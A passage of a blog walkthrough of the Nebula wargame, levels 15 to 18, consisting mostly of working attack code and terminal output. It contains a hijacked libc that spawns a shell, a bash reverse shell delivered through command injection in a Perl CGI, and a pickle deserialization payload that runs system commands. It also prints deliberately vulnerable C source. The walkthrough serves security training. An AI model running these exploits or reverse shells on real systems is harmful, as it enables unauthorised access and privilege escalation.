/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
</pre></div>
</p>

<p>Nuts, we have a symbol missing, namely <code>__cxa_finalize</code>. Let&rsquo;s add it an try again
<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;linux/unistd.h&gt;</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">__cxa_finalize</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">d)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">__libc_start_main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">main)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">),</span> 
<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">init)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fini)</span> 
<span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">rtld_fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">stack_end)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
</pre></div>
</p>

<p>What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux&rsquo;s demands. I searched around and found out about <a href="http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html">version scripts</a>. Let&rsquo;s hope it works</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ cat version
GLIBC_2.0 { };
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script<span style="color: #f92672">=</span>version
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
</pre></div>
</p>

<p><em>sigh</em> - symbol <code>system</code> is missing. Ok, let&rsquo;s just build it statically and wrap it all up so we&rsquo;ve got everything we need. From <code>man gcc</code></p>

<blockquote>
<p><strong>-static-libgcc</strong>
          On systems that provide libgcc as a shared library, these options force the use of either the shared or
          static version respectively.  If no shared version of libgcc
          was built when the compiler was configured, these options have no effect.</p>
</blockquote>

<p>So really we can also get rid of our implementation of <code>__cxa_finalize</code> as it&rsquo;s all statically linked now.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script<span style="color: #f92672">=</span>version,-Bstatic -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ whoami
flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-16:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 16</h2>

<blockquote>
<p>There is a perl script running on port 1616.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/env perl</span>

<span style="color: #66d9ef">use</span> <span style="color: #f8f8f2">CGI</span> <span style="color: #e6db74">qw{param}</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Content-type: text/html\n\n&quot;</span><span style="color: #f8f8f2">;</span>

<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">login</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">];</span>
  <span style="color: #f8f8f2">$password</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">];</span>

  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=~</span> <span style="color: #f8f8f2">tr</span><span style="color: #e6db74">/a-z/</span><span style="color: #f8f8f2">A</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">Z</span><span style="color: #f92672">/</span><span style="color: #f8f8f2">;</span>  <span style="color: #75715e"># conver to uppercase</span>
  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=~</span> <span style="color: #e6db74">s/\s.*//</span><span style="color: #f8f8f2">;</span>    <span style="color: #75715e"># strip everything after a space</span>

  <span style="color: #f8f8f2">@output</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`</span><span style="color: #f8f8f2">;</span>
  <span style="color: #66d9ef">foreach</span> <span style="color: #f8f8f2">$line</span> <span style="color: #f8f8f2">(@output)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">($usr,</span> <span style="color: #f8f8f2">$pw)</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">split(</span><span style="color: #e6db74">/:/</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$line);</span>
  

    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">($pw</span> <span style="color: #f92672">=~</span> <span style="color: #f8f8f2">$password)</span> <span style="color: #f8f8f2">{</span> 
      <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">htmlz</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">($_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Your login was accepted&lt;br/&gt;&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Your login failed&lt;br/&gt;&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #f8f8f2">}</span>  
  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">htmlz(login(param(</span><span style="color: #e6db74">&quot;username&quot;</span><span style="color: #f8f8f2">),</span> <span style="color: #f8f8f2">param(</span><span style="color: #e6db74">&quot;password&quot;</span><span style="color: #f8f8f2">)));</span>
</pre></div>
</p>

<p>So quickly looking at the script we know that we need to pass <code>username</code> and <code>password</code> in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called <code>userdb.txt</code>. Taking a look at this file we notice it&rsquo;s empty, so we need a different exploit. The obvious place here is the <code>egrep</code> call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.</p>

<p>One idea is to use bash&rsquo;s feature that allows us to run a command with a wildcard in the path. For example you can run <code>/bin/ls</code> with <code>/*/ls</code> instead. This
gets us around the uppercase limitation as we can create an uppercase command
at a path we can write to. I&rsquo;ve chosen <code>/tmp</code> as my target.
I&rsquo;m going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:~$ nc -l 1337
</pre></div>
</p>

<p>To create a netcat listener on port <em>1337</em></p>

<p>Next I construct the payload for the script</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:/home/flag16$ cat /tmp/RSHELL
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/192.168.56.101/1337 0&gt;&amp;1
level16@nebula:/home/flag16$ chmod +x /tmp/SHELL
</pre></div>
</p>

<p>Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%60<span style="color: #f8f8f2">&amp;password</span><span style="color: #f92672">=</span>test2
</pre></div>
</p>

<p>Back in the shell where we launched the netcat listener we do the following (the <code>whoami</code> is just to confirm I am the right user)</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:~$ nc -l 1337
bash: no job control in this shell
flag16@nebula:/home/flag16$ getflag
getflag
You have successfully executed getflag on a target account
flag16@nebula:/home/flag16$ whoami
whoami
flag16
</pre></div>
</p>

<h2 id="level-17:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 17</h2>

<blockquote>
<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/python</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">pickle</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">time</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">signal</span>

<span style="color: #f8f8f2">signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">signal(signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SIGCHLD,</span> <span style="color: #f8f8f2">signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SIG_IGN)</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">server</span><span style="color: #f8f8f2">(skt):</span>
  <span style="color: #f8f8f2">line</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>

  <span style="color: #f8f8f2">obj</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">loads(line)</span>

  <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">obj:</span>
    <span style="color: #f8f8f2">clnt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;why did you send me &quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;?</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>

<span style="color: #f8f8f2">skt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">bind((</span><span style="color: #e6db74">&#39;0.0.0.0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">10007</span><span style="color: #f8f8f2">))</span>
<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">listen(</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">)</span>

<span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">True:</span>
  <span style="color: #f8f8f2">clnt,</span> <span style="color: #f8f8f2">addr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">accept()</span>

  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fork()</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">):</span>
    <span style="color: #f8f8f2">clnt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;Accepted connection from %s:%d&quot;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(addr[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">addr[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]))</span>
    <span style="color: #f8f8f2">server(clnt)</span>
    <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
</pre></div>
</p>

<p>Here <code>pickle</code> provides us with the possibility of an exploit to run our own code. There&rsquo;s lots to read on the security issues with <code>pickle</code>, but to be fair it was never meant to be secure in itself. <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a> and <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> are a good source for more info.</p>

<p>Right, so my plan is to get a shell as <em>flag17</em> and get the flag from there. Using pickle&rsquo;s opcodes I can construct a string that will run <code>getflag</code> from the <code>pickle.loads</code> call as user <em>flag17</em>. So before I started constructing this I copied the script and ran it as <em>level17</em> on a different port in order to debug and see what&rsquo;s going on. Once I was happy with my exploit code I changed the port to <code>10007</code> and ran it to get the flag.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/bin/python</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>

<span style="color: #f8f8f2">skt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((</span><span style="color: #e6db74">&#39;localhost&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">10007</span><span style="color: #f8f8f2">))</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">skt</span>
<span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">data</span>
<span style="color: #f8f8f2">sent</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;cos</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">system</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">(S&#39;/bin/bash -c /bin/getflag &gt; /tmp/f17pwned&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">tR</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">sent</span>
<span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">data</span>
<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
</pre></div>
</p>

<p>I&rsquo;ll explain the pickle string a bit:</p>

<ul>
<li><code>cos\nsystem</code> resolves the classname and calls it</li>
<li><code>(</code> is the marker</li>
<li><code>S'/bin/bash -c /bin/getflag &gt; /tmp/f17pwned'\n</code> this is our command we want to run</li>
<li><code>tR\n</code> - <code>t</code> puts the string onto the stack and <code>R</code> pops this tuple and calls it, thus executing our lovingly crafted payload.</li>
</ul>

<p>Once run it looks like it worked so let&rsquo;s be sure</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level17@nebula:/tmp/flag17$ cat ../f17pwned
You have successfully executed getflag on a target account
</pre></div>
</p>

<h2 id="level-18:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 18</h2>

<blockquote>
<p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
</blockquote>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include &lt;getopt.h&gt;</span>

<span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">FILE</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">debugfile;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">verbose;</span>
  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">loggedin;</span>
<span style="color: #f8f8f2">}</span> <span style="color: #f8f8f2">globals;</span>

<span style="color: #75715e">#define dprintf(...) if(globals.debugfile) \</span>
<span style="color: #75715e">  fprintf(globals.debugfile, __VA_ARGS__)</span>
<span style="color: #75715e">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \</span>
<span style="color: #75715e">  fprintf(globals.debugfile, __VA_ARGS__)</span>

<span style="color: #75715e">#define PWFILE &quot;/home/flag18/password&quot;</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">login</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">pw)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">FILE</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">fp;</span>

  <span style="color: #f8f8f2">fp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fopen(PWFILE,</span> <span style="color: #e6db74">&quot;r&quot;</span><span style="color: #f8f8f2">);</span>
  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fp)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">file[</span><span style="color: #ae81ff">64</span><span style="color: #f8f8f2">];</span>

    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fgets(file,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(file)</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">fp)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Unable to read password file %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">PWFILE);</span>
      <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span>
                <span style="color: #f8f8f2">fclose(fp);</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strcmp(pw,</span> <span style="color: #f8f8f2">file)</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>    
  <span style="color: #f8f8f2">}</span>
  <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;logged in successfully (with%s password file)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> 
    <span style="color: #f8f8f2">fp</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL</span> <span style="color: #f92672">?</span> <span style="color: #e6db74">&quot;out&quot;</span> <span style="color: #f92672">:</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">);</span>
  
  <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>

<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">notsupported</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">what)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>
  <span style="color: #f8f8f2">asprintf(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #e6db74">&quot;--&gt; [%s] is unsupported at this current time.</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">what);</span>
  <span style="color: #f8f8f2">dprintf(what);</span>
  <span style="color: #f8f8f2">free(buffer);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">setuser</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">user)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">msg[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>

  <span style="color: #f8f8f2">sprintf(msg,</span> <span style="color: #e6db74">&quot;unable to set user to &#39;%s&#39; -- not supported.</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">user);</span>
  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">msg);</span>

<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
<span style="color: #f8f8f2">{</span>
  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">c;</span>

  <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">((c</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getopt(argc,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #e6db74">&quot;d:v&quot;</span><span style="color: #f8f8f2">))</span> <span style="color: #f92672">!=</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">switch</span><span style="color: #f8f8f2">(c)</span> <span style="color: #f8f8f2">{</span>
      <span style="color: #66d9ef">case</span> <span style="color: #e6db74">&#39;d&#39;</span><span style="color: #f92672">:</span>
        <span style="color: #f8f8f2">globals.debugfile</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fopen(optarg,</span> <span style="color: #e6db74">&quot;w+&quot;</span><span style="color: #f8f8f2">);</span>
        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.debugfile</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;Unable to open %s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">optarg);</span>
        <span style="color: #f8f8f2">setvbuf(globals.debugfile,</span> <span style="color: #f8f8f2">NULL,</span> <span style="color: #f8f8f2">_IONBF,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
        <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
      <span style="color: #66d9ef">case</span> <span style="color: #e6db74">&#39;v&#39;</span><span style="color: #f92672">:</span>
        <span style="color: #f8f8f2">globals.verbose</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">;</span>
        <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">}</span>
  <span style="color: #f8f8f2">}</span>

  <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Starting up. Verbose level = %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">globals.verbose);</span>

  <span style="color: #f8f8f2">setresgid(getegid(),</span> <span style="color: #f8f8f2">getegid(),</span> <span style="color: #f8f8f2">getegid());</span>
  <span style="color: #f8f8f2">setresuid(geteuid(),</span> <span style="color: #f8f8f2">geteuid(),</span> <span style="color: #f8f8f2">geteuid());</span>
  
  <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">line[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p,</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">q;</span>

    <span style="color: #f8f8f2">q</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fgets(line,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(line)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">stdin);</span>
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(q</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
    <span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">strchr(line,</span> <span style="color: #e6db74">&#39;\n&#39;</span><span style="color: #f8f8f2">);</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(p)</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
